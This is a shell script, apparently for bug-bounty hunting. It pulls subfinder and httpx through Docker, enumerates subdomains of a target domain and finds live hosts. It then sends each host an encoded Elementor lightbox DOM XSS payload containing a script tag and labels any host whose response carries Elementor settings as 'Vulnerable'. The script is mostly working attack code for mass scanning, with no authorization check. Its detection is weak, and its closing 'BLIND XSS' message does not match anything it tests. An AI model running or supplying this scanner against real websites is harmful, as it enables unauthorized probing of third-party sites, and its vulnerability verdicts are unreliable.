#!/bin/sh
#install subfinder
docker pull projectdiscovery/subfinder


#alias subfinder
alias subfinder='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/subfinder'


#install httpx
docker pull projectdiscovery/httpx


#alias httpx
alias httpx='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/httpx'



echo "subfinder & httpx  successfully installs "


#enumeration subdomain
subfinder -d $1 -silent >> $1subdomain.txt
 

wc -l <  $1subdomain.txt 
 echo "enumeration subdomain  successfully  " 


echo "enumeration httpx  successfully  " 
httpx -l $1subdomain.txt  -o  $1live.txt

wc -l <  $1live.txt


#dom xss
# $ sed -e 's/^/https:\/\//' $1live.txt > $1livehttps.txt

while read line; do curl -s --path-as-is --insecure "$line/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9"  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36' | grep -qs "data-elementor-settings=" && echo -e "\033[0;36m$line \033[0;31m" Vulnerable;done < $1live.txt



 echo " BLIND XSS  successfully  " 
